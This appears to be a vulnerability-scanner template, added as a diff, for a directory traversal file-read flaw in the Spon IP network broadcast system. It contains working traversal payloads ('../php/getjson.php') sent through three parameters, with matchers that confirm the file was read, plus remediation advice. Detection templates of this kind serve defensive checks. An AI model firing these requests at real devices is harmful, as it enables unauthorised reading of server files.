@@ -1,0 +1,62 @@
+id: SponIpIntercom-File-Read
+info:
+  name: SponIpIntercom-File-Read
+  author:
+  - l0ne1y
+  description: |-
+    Spon IP network broadcast system arbitrary file read vulnerability
+    Passing the downname parameter without filtering the ../ symbol allows directory traversal to read files
+  severity: high
+  remediation: |-
+    Official remediation advice:
+    The vendor has not yet provided a patch. Please follow the vendor's homepage for timely updates:
+    https://www.spon.com.cn/sfhy/106.html
+
+    Temporary remediation advice:
+
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Use regular expressions to strictly validate the format of user input parameters, hard-code or uniformly encode the file name parameters passed by users, control file types via a whitelist, and reject parameters containing malicious or empty characters.
+    3. Prohibit the system from providing directory traversal services, e.g., configure open_basedir in php.ini to limit the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download files.
+    5. Perform permission checks before users download files.
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - require_once ('conversion.php');
+    - $json_string = file_get_contents($fullpath);
+  path:
+  - '{{BaseURL}}/php/rj_get_token.php'
+  method: POST
+  body: jsondata[url]=../php/getjson.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - require_once ('conversion.php');
+    - $json_string = file_get_contents($fullpath);
+  path:
+  - '{{BaseURL}}/php/exportrecord.php?downname=../php/getjson.php'
+  method: POST
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - require_once ('conversion.php');
+    - $json_string = file_get_contents($fullpath);
+  path:
+  - '{{BaseURL}}/php/getjson.php'
+  method: POST
+  body: jsondata[filename]=../php/getjson.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+variables:
+  veritify: '{{rand_int(200000000, 210000000)}}'
